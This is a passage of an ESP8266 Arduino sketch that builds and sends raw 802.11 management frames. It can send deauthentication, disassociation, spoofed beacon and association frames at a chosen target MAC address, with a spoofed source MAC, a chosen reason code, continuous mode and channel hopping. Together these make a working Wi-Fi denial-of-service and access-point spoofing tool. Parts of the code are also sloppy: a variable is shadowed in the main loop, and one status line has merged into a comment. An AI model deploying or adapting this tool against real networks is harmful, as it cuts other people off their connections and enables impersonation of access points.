            current_channel = next_ch;
            found_clear_channel = true;
            retry_count = 0;
        }
    }
    
    return found_clear_channel;
}

// Build and transmit the selected frame type
bool attempt_transmission(uint8_t current_channel) {
    static uint8_t retry_count = 0;
    const uint8_t MAX_TX_RETRIES = 3;
    bool success = false;
    uint16_t packet_size = 0;
    uint8_t* tx_buffer = packet_buffer;
    const char* tx_ssid = ssid;
    uint8_t tx_channel = current_channel;
    uint8_t tx_rate = 2; // 1 Mbps

    while (retry_count < MAX_TX_RETRIES && !success) {
        if (!check_hardware_ready()) {
            delay(1);
            continue;
        }

        switch (selected_frame) {
            case FRAME_ASSOC_REQ:
                packet_size = build_association_packet(packet_buffer, target_mac, source_mac, tx_ssid, tx_channel);
                tx_buffer = packet_buffer;
                break;
            case FRAME_BEACON:
                packet_size = build_beacon_packet(beacon_buffer, source_mac, tx_ssid, tx_channel);
                tx_buffer = beacon_buffer;
                break;
            case FRAME_DEAUTH:
                packet_size = build_deauth_packet(deauth_buffer, target_mac, source_mac, target_mac, reason_code);
                tx_buffer = deauth_buffer;
                break;
            case FRAME_DISASSOC:
                packet_size = build_disassoc_packet(disassoc_buffer, target_mac, source_mac, target_mac, reason_code);
                tx_buffer = disassoc_buffer;
                break;
            default:
                packet_size = build_association_packet(packet_buffer, target_mac, source_mac, tx_ssid, tx_channel);
                tx_buffer = packet_buffer;
                break;
        }

        success = transmit_raw_packet(tx_buffer, packet_size, tx_rate, tx_channel);

        if (!success) {
            retry_count++;
            delayMicroseconds(random(500, 1500)); // Random backoff
        } else {
            retry_count = 0;
        }
    }

    update_channel_stats(current_channel, success);
    return success;
}


void setup() {
  // Initialize serial for debugging
  Serial.begin(115200);
  delay(1000);
  Serial.println("\n\nESP8266 Raw 802.11 Management Frame Transmitter");
  Serial.println("This sketch crafts and transmits raw 802.11 management frames");
  Serial.println("==================================================================");

  // Initialize channel statistics
  initialize_channel_stats();

  // Configure ESP8266 as a station
  wifi_set_opmode(STATION_MODE);

  // Disable automatic connections
  wifi_station_disconnect();
  wifi_station_set_auto_connect(0);

  // Set MAC address if necessary
  wifi_set_macaddr(STATION_IF, source_mac);
  // Initialize WiFi channel
  set_wifi_channel(1);  // Start on channel 1

  // Build initial packet for selected frame type
  uint16_t packet_size = 0;
  uint8_t current_channel = get_wifi_channel();
  switch (selected_frame) {
    case FRAME_ASSOC_REQ:
      packet_size = build_association_packet(packet_buffer, target_mac, source_mac, ssid, current_channel);
      break;
    case FRAME_BEACON:
      packet_size = build_beacon_packet(beacon_buffer, source_mac, ssid, current_channel);
      break;
    case FRAME_DEAUTH:
      packet_size = build_deauth_packet(deauth_buffer, target_mac, source_mac, target_mac, reason_code);
      break;
    case FRAME_DISASSOC:
      packet_size = build_disassoc_packet(disassoc_buffer, target_mac, source_mac, target_mac, reason_code);
      break;
    default:
      packet_size = build_association_packet(packet_buffer, target_mac, source_mac, ssid, g_wifi_channel);
      break;
  }

  Serial.printf("Initial frame type: %d, packet size: %d bytes\n", selected_frame, packet_size);

  if (debug_mode) {
    Serial.println("Packet hex dump:");
    uint8_t* dbg_buf = packet_buffer;
    if (selected_frame == FRAME_BEACON) dbg_buf = beacon_buffer;
    else if (selected_frame == FRAME_DEAUTH) dbg_buf = deauth_buffer;
    else if (selected_frame == FRAME_DISASSOC) dbg_buf = disassoc_buffer;
    for (int i = 0; i < packet_size; i++) {
      if (i % 16 == 0) Serial.printf("\n%04X: ", i);
      Serial.printf("%02X ", dbg_buf[i]);
    }
    Serial.println("\n");
    print_packet_details(dbg_buf, packet_size);
  }

  delay(2000);  // Wait 2 seconds before transmitting

  Serial.println("Transmitting initial frame...");
  bool tx_result = false;
  uint8_t* tx_buf = packet_buffer;
  if (selected_frame == FRAME_BEACON) tx_buf = beacon_buffer;
  else if (selected_frame == FRAME_DEAUTH) tx_buf = deauth_buffer;
  else if (selected_frame == FRAME_DISASSOC) tx_buf = disassoc_buffer;
  tx_result = transmit_raw_packet(tx_buf, packet_size, 2, g_wifi_channel);

  if (tx_result) {
    Serial.println("Transmission successful!");
  } else {
    Serial.println("Transmission failed! Error in packet structure or hardware access.");
    Serial.println("Try adjusting packet structure according to IEEE 802.11 standard.");
  }

  print_command_menu();

  Serial.println("\nAvailable commands:");
  Serial.println("t - Trigger manual transmission");
  Serial.println("c - Toggle continuous mode");
  Serial.println("d - Toggle debug mode");
  Serial.println("h - Show this help");
  Serial.println("s - Show current status");
  Serial.println("1-9 - Set WiFi channel");
  Serial.println("m - Change target MAC address");
  Serial.println("f - Select frame type");
  Serial.println("n - Set SSID");
  Serial.println("r - Set reason code (deauth/disassoc)");
}

void loop() {
  static unsigned long last_tx = 0;
  static unsigned long last_hop = 0;
  static uint8_t current_channel = 1;
  static bool continuous_mode = false;
  unsigned long now = millis();
  
  // Update channel hopping strategy based on conditions
  update_channel_strategy();  // Channel hopping timing
  if (now - last_hop >= DWELL_TIME) {
    uint8_t current_channel = get_wifi_channel();
    bool clear_channel = perform_channel_hop(current_channel);
    if (clear_channel) {
        set_wifi_channel(current_channel);
    }
    last_hop = now;
    
    if (debug_mode) {
      Serial.printf("Hopped to channel %d (Channel %s)\n", 
                   current_channel,
                   clear_channel ? "clear" : "busy");
    }
  }
  
  // Handle continuous transmission mode
  if (continuous_mode && (now - last_tx > CHANNEL_SWITCH_DELAY)) {
    if (!check_hardware_ready()) {
      Serial.println("Hardware busy, skipping transmission");
      return;
    }
      // Attempt transmission with retries and backoff
    bool tx_result = attempt_transmission(current_channel);
      if (debug_mode) {
        uint8_t fail_count, busy_count;
        bool blacklisted;
        get_channel_stats_debug(current_channel, fail_count, busy_count, blacklisted);
        
        Serial.printf("Transmission attempt on channel %d: %s\n", 
                     current_channel,
                     tx_result ? "SUCCESS" : "FAILED");
        Serial.printf("Channel stats - Fails: %d, Busy: %d, Blacklisted: %s\n",
                     fail_count, busy_count, blacklisted ? "Yes" : "No");
    }
    
    int status = tx_result ? 0 : 1;
    Serial.printf("Transmission %s: %s\n", 
                 tx_result ? "successful" : "failed",
                 get_tx_status_string(status));
      if (debug_mode && tx_result) {
      uint16_t dbg_packet_size = 0;
      switch (selected_frame) {
        case FRAME_BEACON:
          dbg_packet_size = build_beacon_packet(beacon_buffer, source_mac, ssid, current_channel);
          print_packet_details(beacon_buffer, dbg_packet_size);
          break;
        case FRAME_DEAUTH:
          dbg_packet_size = build_deauth_packet(deauth_buffer, target_mac, source_mac, target_mac, reason_code);
          print_packet_details(deauth_buffer, dbg_packet_size);
          break;
        case FRAME_DISASSOC:
          dbg_packet_size = build_disassoc_packet(disassoc_buffer, target_mac, source_mac, target_mac, reason_code);
          print_packet_details(disassoc_buffer, dbg_packet_size);
          break;
        default:
          dbg_packet_size = build_association_packet(packet_buffer, target_mac, source_mac, ssid, current_channel);
          print_packet_details(packet_buffer, dbg_packet_size);
          break;
      }
    }
    
    // Channel hopping
    channel_scan = next_channel(channel_scan);
    last_tx = now;
  }
  
  // Handle serial commands
  if (Serial.available()) {
    char cmd = Serial.read();
    uint16_t packet_size = 0;
    
    // Frame type selection helper
    auto select_frame_type = [&]() {
      Serial.println("Select frame type:");
      Serial.println("0 - Association Request");
      Serial.println("1 - Beacon");
      Serial.println("2 - Deauthentication");
      Serial.println("3 - Disassociation");
      while (!Serial.available());
      char ftype = Serial.read();
      if (ftype >= '0' && ftype <= '3') {
        selected_frame = (FrameType)(ftype - '0');
        Serial.printf("Frame type set to %d\n", selected_frame);
      } else {
        Serial.println("Invalid frame type");
      }
    };
    
    switch(cmd) {
      case 't': // Trigger single transmission
        {
          Serial.println("Manual transmission triggered");
          if (!check_hardware_ready()) {
            Serial.println("Hardware busy, please wait");
            break;
          }          uint16_t packet_size = 0;
          uint8_t* tx_buf = packet_buffer;
          uint8_t current_channel = get_wifi_channel();
          switch (selected_frame) {
            case FRAME_ASSOC_REQ:
              packet_size = build_association_packet(packet_buffer, target_mac, source_mac, ssid, current_channel);
              tx_buf = packet_buffer;
              break;
            case FRAME_BEACON:
              packet_size = build_beacon_packet(beacon_buffer, source_mac, ssid, current_channel);
              tx_buf = beacon_buffer;
              break;
            case FRAME_DEAUTH:
              packet_size = build_deauth_packet(deauth_buffer, target_mac, source_mac, target_mac, reason_code);
              tx_buf = deauth_buffer;
              break;
            case FRAME_DISASSOC:
              packet_size = build_disassoc_packet(disassoc_buffer, target_mac, source_mac, target_mac, reason_code);
              tx_buf = disassoc_buffer;
              break;
            default:
              packet_size = build_association_packet(packet_buffer, target_mac, source_mac, ssid, g_wifi_channel);
              tx_buf = packet_buffer;
              break;
          }
          bool tx_result = transmit_raw_packet(tx_buf, packet_size, 2, g_wifi_channel);
          Serial.printf("Transmission %s\n", tx_result ? "successful" : "failed");
          if (debug_mode) print_packet_details(tx_buf, packet_size);
        }
        break;

      case 'c': // Toggle continuous mode
        continuous_mode = !continuous_mode;
        Serial.printf("Continuous mode: %s\n", continuous_mode ? "ON" : "OFF");
        break;

      case 'd': // Toggle debug mode
        debug_mode = !debug_mode;
        Serial.printf("Debug mode: %s\n", debug_mode ? "ON" : "OFF");
        break;      case 'l': // Toggle all hopping logs
        hop_log_enabled = !hop_log_enabled;
        Serial.printf("All hopping logs: %s\n", hop_log_enabled ? "ON" : "OFF");
        break;

      case 'e': // Toggle error-only logging
        hop_log_on_error = !hop_log_on_error;
        Serial.printf("Error logging: %s\n", hop_log_on_error ? "ON" : "OFF");
        break;

      case 'u': // Toggle success logging
        hop_log_on_success = !hop_log_on_success;
        Serial.printf("Success logging: %s\n", hop_log_on_success ? "ON" : "OFF");
        break;

      case 's': // Show status        Serial.println("\n=== Current Status ===");
        Serial.printf("Continuous Mode: %s\n", continuous_mode ? "ON" : "OFF");
        Serial.printf("Debug Mode: %s\n", debug_mode ? "ON" : "OFF");
        Serial.printf("Current Channel: %d\n", get_wifi_channel());
        Serial.printf("Target MAC: %02X:%02X:%02X:%02X:%02X:%02X\n",
                     target_mac[0], target_mac[1], target_mac[2],
                     target_mac[3], target_mac[4], target_mac[5]);
        Serial.printf("Source MAC: %02X:%02X:%02X:%02X:%02X:%02X\n",
                     source_mac[0], source_mac[1], source_mac[2],
                     source_mac[3], source_mac[4], source_mac[5]);
        Serial.printf("SSID: %s\n", ssid);
        Serial.printf("Frame Type: %d\n", selected_frame);
        Serial.printf("Reason Code: 0x%04X\n", reason_code);
        Serial.println("===================");
        break;

      case 'm': // Set custom MAC
        if (Serial.available() >= 17) { // Wait for complete MAC (XX:XX:XX:XX:XX:XX)
          char mac_str[18];
          Serial.readBytes(mac_str, 17);
          mac_str[17] = '\0';
          if (parse_mac_address(mac_str, target_mac)) {
            Serial.println("MAC address updated successfully");
          } else {
            Serial.println("Invalid MAC address format");
          }
        }
        break;      case 'f': // Select frame type
        select_frame_type();
        break;      case 'n': // Set SSID
        {  // Add block scope
          Serial.println("Enter new SSID (max 32 chars):");
          while (!Serial.available());
          int len = Serial.readBytesUntil('\n', ssid, 32);
          ssid[len] = '\0';
          Serial.printf("SSID set to: %s\n", ssid);
        }
        break;

      case 'r': // Set reason code
        {  // Add block scope
          Serial.println("Enter reason code (hex, e.g. 0001):");
          while (!Serial.available());
          char reason_str[5] = {0};
          int len = Serial.readBytes(reason_str, 4);
          reason_str[4] = '\0';
          unsigned int val = 0;
          sscanf(reason_str, "%x", &val);
          reason_code = (uint16_t)val;
          Serial.printf("Reason code set to: 0x%04X\n", reason_code);
        }
        break;
        
      default:
        if (cmd >= '1' && cmd <= '9') {
          uint8_t new_channel = cmd - '0';
          set_wifi_channel(new_channel);
          Serial.printf("Channel set to %d\n", get_wifi_channel());
        }
        break;
    }
  }
    // Handle serial buffer and yield CPU
  yield();
}